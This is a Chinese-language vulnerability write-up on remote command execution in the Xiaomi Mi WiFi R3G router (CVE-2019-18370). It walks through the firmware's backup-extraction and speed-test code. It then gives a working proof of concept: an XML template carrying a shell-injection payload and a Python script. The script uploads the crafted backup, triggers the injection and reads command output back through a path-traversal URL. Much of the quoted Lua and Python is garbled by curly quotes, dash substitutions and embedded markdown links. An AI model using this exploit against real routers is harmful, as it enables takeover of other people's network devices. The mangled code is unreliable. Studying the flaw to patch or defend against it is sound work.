---
title: "（CVE-2019-18370）Xiaomi Mi WiFi R3G 远程命令执行漏洞"
id: zhfly3406
---

# （CVE-2019-18370）Xiaomi Mi WiFi R3G 远程命令执行漏洞

## 一、漏洞简介

Xiaomi Mi WiFi R3G是中国小米科技（Xiaomi）公司的一款3G路由器。 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。

## 二、漏洞影响

Xiaomi Mi WiFi R3G 2.28.23-stable之前版本

## 三、复现过程

备份文件是`tar.gz`格式的，上传后`tar zxf`解压，所以构造备份文件，可以控制解压目录的文件内容，结合测试上传下载速度功能的sh脚本执行时读取测试url列表文件，并将url部分直接进行命令拼接执行。

*   备份文件解压导致`/tmp/`目录任意文件可控

    在`/usr/lib/lua/luci/controller/api/misystem.lua`中，配置文件功能如下

```
function cUpload()
    local LuciFs = require("luci.fs")
    local XQBackup = require("xiaoqiang.module.XQBackup")
    local code = 0
    local canupload = true
    local uploadFilepath = "/tmp/cfgbackup.tar.gz"
    local fileSize = tonumber(LuciHttp.getenv("CONTENT_LENGTH"))
    if fileSize > 102400 then
        canupload = false
    end
    LuciHttp.setfilehandler(
        function(meta, chunk, eof)
            if canupload then
                if not fp then
                    if meta and meta.name == "image" then
                        fp = io.open(uploadFilepath, "w")
                    end
                end
                if chunk then
                    fp:write(chunk)
                end
                if eof then
                    fp:close()
                end
            else
                code = 1630
            end
        end
    )
    if LuciHttp.formvalue("image") and fp then
        code = 0
    end
    local result = {}
    if code == 0 then
        local ext = XQBackup.extract(uploadFilepath)
        if ext == 0 then
            result["des"] = XQBackup.getdes()
        else
            code = 1629
        end
    end
    if code ~= 0 then
        result["msg"] = XQErrorUtil.getErrorMessage(code)
        LuciFs.unlink(uploadFilepath)
    end
    result["code"] = code
    LuciHttp.write_json(result)
end 
```

其中调用`XQBackup.extract(uploadFilepath)`进行解压

```
-- 0:succeed
-- 1:file does not exist
-- 2:no description file
-- 3:no mbu file
function extract(filepath)
    local fs = require("nixio.fs")
    local tarpath = filepath
    if not tarpath then
        tarpath = TARMBUFILE
    end
    if not fs.access(tarpath) then
        return 1
    end
    os.execute("cd /tmp; tar -xzf "..tarpath.." >/dev/null 2>/dev/null")
    os.execute("rm "..tarpath.." >/dev/null 2>/dev/null")
    if not fs.access(DESFILE) then
        return 2
    end
    if not fs.access(MBUFILE) then
        return 3
    end
    return 0
end 
```

可知，`/tmp`目录下的任意文件可控

*   `/usr/bin/upload_speedtest,/usr/bin/download_speedtest`等会读取`/tmp/speedtest_urls.xml`并提取url直接进行命令拼接，且这几个脚本可以通过web接口调用

举例，查看`/usr/bin/download_speedtest`文件

```
#!/usr/bin/env lua
-- ...
local cfg = {
-- ...
	['xmlfile'] = "/usr/share/speedtest.xml",
        ['tmp_speedtest_xml'] = "/tmp/speedtest_urls.xml",
}
VERSION="__UNDEFINED__"
-- ...
-- 测试网速使用的url文件为，若存在/tmp/speedtest_urls.xml则使用，否则用/usr/share/speedtest.xml
local filename = ""
filexml = io.open(cfg.tmp_speedtest_xml)
if filexml then
    filexml:close()
    filename = cfg.tmp_speedtest_xml
else
    filename = cfg.xmlfile
end

local pp = io.open(filename)

local line = pp:read("*line")

local size = 0

local resources = {}

local u = “”

local pids = {}

– …

function wget_work(url)

local _url = url

pid = posix.fork()

if pid < 0 then

print(“fork error”)

return -1

elseif pid > 0 then

–print(string.format(“child pid %d\n”, pid))

else

– 拼接命令，最终在这里执行

os.execute('for i in $(seq ‘… math.floor(cfg.nr/cfg.nc) …’); do wget '… url  …

" -q -O /dev/null; done")

end

return pid

end

while line do

– 从文件中提取url， 这里提取没有进行过滤

local _, _, url = string.find(line,’<item url="(.*)"/>’)

if url then

table.insert(resources, url)

end

line = pp:read("*line")

end

pp:close()

local urls = mrandom(1, table.getn(resources), cfg.nc) `for k, v in ipairs(urls) do

if VERSION == “LESSMEM” then

local pid = wget_work_loop(resources[v])

else

– VERSION 为 **UNDEFINED**， url直接作为参数

local pid = wget_work(resources[v])

end

if(pid == 0) then

os.exit(0)

elseif(pid == -1) then

done()

end

end` 
```

调用的地方貌似有好几个，其中`/usr/lib/lua/luci/controller/api/xqnetdetect.lua`中

```
function netspeed()
    local XQPreference = require("xiaoqiang.XQPreference")
    local XQNSTUtil = require("xiaoqiang.module.XQNetworkSpeedTest")
    local code = 0
    local result = {}
    local history = LuciHttp.formvalue("history")
    if history then
        result["bandwidth"] = tonumber(XQPreference.get("BANDWIDTH", 0, "xiaoqiang"))
        result["download"] = tonumber(string.format("%.2f", 128 * result.bandwidth))
        result["bandwidth2"] = tonumber(XQPreference.get("BANDWIDTH2", 0, "xiaoqiang"))
        result["upload"] = tonumber(string.format("%.2f", 128 * result.bandwidth2))
    else
        os.execute("/etc/init.d/miqos stop")
        -- 这里调用了downloadSpeedTest
        local download = XQNSTUtil.downloadSpeedTest()
        if download then
            result["download"] = download
            result["bandwidth"] = tonumber(string.format("%.2f", 8 * download/1024))
            XQPreference.set("BANDWIDTH", tostring(result.bandwidth), "xiaoqiang")
        else
            code = 1588
        end
        if code ~= 0 then
           result["msg"] = XQErrorUtil.getErrorMessage(code)
        end
        os.execute("/etc/init.d/miqos start")
    end

```
result["code"] = code
LuciHttp.write_json(result) 
``` `end

function downloadSpeedTest()

local speedtest = “/usr/bin/download_speedtest”

local speed

– 直接调用sh文件

for _, line in ipairs(LuciUtil.execl(speedtest)) do

if not XQFunction.isStrNil(line) and line:match("^avg rx:") then

speed = line:match("^avg rx:(%S+)")

if speed then

speed = tonumber(string.format("%.2f",speed/8))

end

break

end

end

return speed

end` 
```

所以，我们只需要构造恶意的`speedtest_urls.xml`文件，构造备份文件，上传备份文件，然后调用网络测试相关的接口，即可以实现命令注入。

### poc

> template.xml

```
<?xml version="1.0"?>
<root>
	<class type="1">
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
	</class>
	<class type="2">
		<item url="http://192.168.31.1 -q -O /dev/null;{command}>/tmp/1.txt; exit; wget http://192.168.31.1  "/>
	</class>
	<class type="3">
		<item uploadurl="http://www.taobao.com/"/>
		<item uploadurl="http://www.so.com/"/>
		<item uploadurl="http://www.qq.com/"/>
		<item uploadurl="http://www.sohu.com/"/>
		<item uploadurl="http://www.tudou.com/"/>
		<item uploadurl="http://www.360doc.com/"/>
		<item uploadurl="http://www.kankan.com/"/>
		<item uploadurl="http://www.speedtest.cn/"/>
	</class>
</root> 
```

> remote_command_execution_vulnerability.py

```
import os
import tarfile
import requests

# proxies = {“http”:“[http://127.0.0.1:8080](http://127.0.0.1:8080)”}

proxies = {}

## get stok

stok = input("stok: ")

## make config file

command = input("command: ")

speed_test_filename = “speedtest_urls.xml”

with open(“template.xml”,“rt”) as f:

template = f.read()

data = template.format(command=command)

# print(data)

with open(“speedtest_urls.xml”,‘wt’) as f:

f.write(data)

with tarfile.open(“payload.tar.gz”, “w:gz”) as tar:

# tar.add(“cfg_backup.des”)

# tar.add(“cfg_backup.mbu”)

tar.add(“speedtest_urls.xml”)

## upload config file

print(“start uploading config file …”)

r1 = requests.post(“[http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload](http://192.168.31.1/cgi-bin/luci/;stok=%7B%7D/api/misystem/c_upload)”.format(stok), files={“image”:open(“payload.tar.gz”,‘rb’)}, proxies=proxies)

# print(r1.text)

## exec download speed test, exec command

print(“start exec command…”)

r2 = requests.get(“[http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed](http://192.168.31.1/cgi-bin/luci/;stok=%7B%7D/api/xqnetdetect/netspeed)”.format(stok), proxies=proxies)

# print(r2.text)

## read result file `r3 = requests.get(“[http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt](http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt)”, proxies=proxies)

if r3.status_code == 200:

print(“success, vul”)

print(r3.text)` 
```

![image](../img/a542a2dabf3b4e0e496a85a8a33ac621.png)

## 参考链接

> https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md